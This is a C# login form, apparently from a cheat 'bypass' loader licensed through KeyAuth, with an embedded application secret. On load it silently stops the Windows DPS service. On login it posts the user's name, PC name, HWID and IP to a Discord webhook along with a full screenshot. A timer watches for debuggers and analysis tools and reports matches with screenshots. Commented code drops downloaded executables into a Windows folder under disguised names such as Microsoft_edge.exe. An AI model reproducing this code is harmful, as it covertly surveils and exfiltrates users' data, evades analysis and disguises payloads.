using ag.Class;
using ag.Forms;
using ag.Others;
using DiscordMessenger;
using KeyAuth;
using Siticone.Desktop.UI.WinForms;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ag
{
    public partial class NLogin : Form
    {
        public static api KeyAuthApp = new api(
    name: "bypass",
    ownerid: "eiqCqtjcJZ",
    secret: "dc7849deebce46bc457d434b1f370dfb1bc6d0bf2ab5d2b3c0c507004bc8add9",
    version: "1.0"
);

        public NLogin()
        {
            InitializeComponent();
        }
        
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool GetAsyncKeyState(int vKey);
        
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern short GetKeyState(int keyCode);
         
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);
         
        public void AlertMsg(string msg, NNotify.enmType type)
        {
            NNotify frm = new NNotify();
            frm.showAlert(msg, type);
        }
         
        public static void SendDisMessage(string URL, string json)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(json);
            wr.GetResponse();
        }
         
        private static void SendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
         
        public static void PtzinScreen()
        {
            try
            {
                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\eu.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("suawebhookcrl", nomeArquivo);
            }
            catch
            {

            }
        }
         
        public static void PtzinCrack()
        {
            try
            {
                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\ela.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("suawebhookcrl", nomeArquivo);
            }
            catch
            {

            }
        }
         
        private void siticonePanel1_Paint(object sender, PaintEventArgs e)
        {

        }
         
        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
            Application.Exit();
            Application.ExitThread();
        }
         
        private async void NLogin_Load(object sender, EventArgs e)
        {
            Process process = new Process();
            process.StartInfo.FileName = "sc.exe";
            process.StartInfo.Arguments = "stop dps";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            Thread.Sleep(1000);
            if (Program.goodday != 38473823)
            {
                Environment.Exit(0);
                Application.Exit();
                Application.ExitThread();
            }
           // SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
            KeyAuthApp.init();
            this.Text = mcyAy.RandomString(27);
            await Task.Delay(500);
            debug.Stop();
        }
         
        private void label4_Click(object sender, EventArgs e)
        {
            NRegister Nash = new NRegister();
            Nash.Show();
            base.Hide();
        }
        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
            label6.Visible = false;
            label1.Visible = false;
            label2.Visible = false;
            pass.Visible = false;
            user.Visible = false;
            siticoneButton1.Visible = false;
            siticonePictureBox1.Visible = false;
            siticoneCircleProgressBar1.Visible = true;

            await Task.Run(() =>
            {

                //byte[] array = NLogin.KeyAuthApp.download("563817");
                //File.WriteAllBytes("C:\\Windows\\PolicyDefinitions\\Microsoft_edge.exe", array); //evnt
                //byte[] array1 = NLogin.KeyAuthApp.download("351013");
                //File.WriteAllBytes("C:\\Windows\\PolicyDefinitions\\Haandwriting.exe", array1); //sysmain
                Thread.Sleep(2000);
                // Define a ação que será executada de forma assíncrona
                KeyAuthApp.login(user.Text, pass.Text);


                // Atualiza o valor da barra de progresso a cada iteração do loop
            });
            if (KeyAuthApp.response.success)
                {
                AlertMsg("Successfully Logged!", NNotify.enmType.Error);
                new DiscordMessage()
    .SetUsername("Stopped Bypass")
    .SetAvatar("https://cdn.discordapp.com/attachments/1062229548139290737/1091076710046380192/icon.png")
    .AddEmbed()
    .SetTimestamp(DateTime.Now)
    .SetTitle("\nStopped Logins")
    .SetDescription(("> **User:** " + Environment.UserName.ToString() +
    "\n > **Pc Name:** " + Dns.GetHostEntry(Environment.MachineName).HostName.ToString() +
    "\n > **HWID:** " + System.Security.Principal.WindowsIdentity.GetCurrent().User.Value) +
    "\n > **IP Address:** " + NLogin.KeyAuthApp.user_data.ip)
    .SetColor(0xCA1818)
    .SetFooter("Stopped - Logs", "https://cdn.discordapp.com/attachments/1062229548139290737/1091076710046380192/icon.png")
    .Build()
    .SendMessage("suawebhookcrl");
                    var message = new DiscordMessage
                    {
                        Content = "Kek",
                        Embeds = new List<Embed>()

                {
                new Embed
                {
                   Description = "Kek"
                }
                }
                    };
                    PtzinScreen();
                    NMain morningMain = new NMain();
                    morningMain.Show();

                    int x = this.Location.X;
                    int y = this.Location.Y;
                    morningMain.Location = new Point(x, y);

                    this.Hide();

            }
            else
                {
                AlertMsg(KeyAuthApp.response.message, NNotify.enmType.Error);
            }
        }
        bool dnspy = false;

        private void debug_Tick(object sender, EventArgs e)
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process theprocess in processlist)
            {
                if (theprocess.MainWindowTitle != "")
                {
                    if (theprocess.MainWindowTitle.Contains("renamedSpy") || theprocess.MainWindowTitle.Contains("Process Explorer") || theprocess.MainWindowTitle.Contains("System Informer") || theprocess.MainWindowTitle.Contains("dnSpy") || theprocess.MainWindowTitle.Contains("dnspy") || theprocess.MainWindowTitle.Contains("Process Hacker") || theprocess.MainWindowTitle.Contains("ProcessHacker") || theprocess.MainWindowTitle.Contains("process hacker") || theprocess.MainWindowTitle.Contains("JetBrains") || theprocess.MainWindowTitle.Contains("dotPeek") || theprocess.MainWindowTitle.Contains("jetbrains") || theprocess.MainWindowTitle.Contains("Cheat Engine") || theprocess.MainWindowTitle.Contains("cheatengine") || theprocess.MainWindowTitle.Contains("cheat engine") || theprocess.MainWindowTitle.Contains("MegaDumper") || theprocess.MainWindowTitle.Contains("megadumper") || theprocess.MainWindowTitle.Contains("OllyDbg") || theprocess.MainWindowTitle.Contains("HxD") || theprocess.MainWindowTitle.Contains("xVenoxi Dumper") || theprocess.MainWindowTitle.Contains("NativeDumper MFC Application") || theprocess.MainWindowTitle.Contains("JetBrains dotPeek") || theprocess.MainWindowTitle.Contains("CodeCracker") || theprocess.MainWindowTitle.Contains("Hacker") || theprocess.MainWindowTitle.Contains("calculator") || theprocess.MainWindowTitle.Contains("ILSpy") || theprocess.MainWindowTitle.Contains("Reflector") || theprocess.MainWindowTitle.Contains("KsDumper") || theprocess.MainWindowTitle.Contains("IIDA") || theprocess.MainWindowTitle.Contains("The Interactive Disassembler") || theprocess.MainWindowTitle.Contains("ExtremeDumper") || theprocess.MainWindowTitle.Contains("scylla") || theprocess.MainWindowTitle.Contains("dbg") || theprocess.MainWindowTitle.Contains("dumper") || theprocess.MainWindowTitle.Contains("Supsend") || theprocess.MainWindowTitle.Contains("Cheat"))
                    {
                        if (dnspy == false)
                        {
                            dnspy = true;
                            new DiscordMessage()
   .SetUsername("Stopped Bypass")
   .SetAvatar("https://cdn.discordapp.com/attachments/1062229548139290737/1091076710046380192/icon.png")
   .AddEmbed()
   .SetTimestamp(DateTime.Now)
   .SetTitle("\nStopped Anti Crack")
   .SetDescription(("> **User:** " + Environment.UserName.ToString() +
   "\n > **Pc Name:** " + Dns.GetHostEntry(Environment.MachineName).HostName.ToString() +
   "\n > **HWID:** " + System.Security.Principal.WindowsIdentity.GetCurrent().User.Value) +
   "\n > **IP Address:** " + NLogin.KeyAuthApp.user_data.ip +
   "\n > **Cracked Tool:** " + theprocess.MainWindowTitle)
   .SetColor(0xCA1818)
   .SetFooter("Stopped - Logs", "https://cdn.discordapp.com/attachments/1062229548139290737/1091076710046380192/icon.png")
   .Build()
   .SendMessage("suawebhookcrl");
                            var message = new DiscordMessage
                            {
                                Content = "Kek",
                                Embeds = new List<Embed>()

                {
                new Embed
                {
                   Description = "Kek"
                }
                }
                            };
                            PtzinCrack();
                            Application.Exit();
                        }
                    }
                }
            }
            }
         
        const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
         
        private void timer1_Tick(object sender, EventArgs e)
        {
           
        }
         
        private void timer2_Tick(object sender, EventArgs e)
        {

        }
         
        private void user_TextChanged(object sender, EventArgs e)
        {

        }
         

        private void siticonePanel1_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {
            NRegister Nash = new NRegister();
            Nash.Show();
            base.Hide();
        }
        int dir = 1;
        private void timer2_Tick_1(object sender, EventArgs e)
        {
            if (siticoneCircleProgressBar1.Value == 90)
            {
                dir = -1;
                siticoneCircleProgressBar1.AnimationSpeed = 3;

            }
            if (siticoneCircleProgressBar1.Value == 10)
            {
                dir = +1;
                siticoneCircleProgressBar1.AnimationSpeed = 2;

            }
            siticoneCircleProgressBar1.Value += dir;
        }
    }
}
